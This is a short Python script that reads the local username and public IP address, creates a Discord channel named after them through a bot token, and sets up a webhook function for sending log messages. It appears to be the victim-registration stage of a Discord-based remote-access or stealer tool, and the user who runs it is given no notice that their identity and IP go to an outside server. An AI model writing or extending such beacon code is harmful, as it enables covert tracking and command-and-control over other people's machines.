import os
import sys
import shutil
import requests
from dotenv import load_dotenv

load_dotenv()

url = os.getenv('webhook_url_logs')
guild_id = os.getenv('guild_id')
token_dc = os.getenv('token_dc')


def send(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(url, json=payload)
    return response

ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
usuario = os.getlogin()

criar_canal = {
    "name": f'{usuario} - {ip_publico}',
    "type": 0

}

headers = {
    "Authorization": f"Bot {token_dc}",
    "Content-Type": "application/json"
}

response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)
print(response.json()['name'])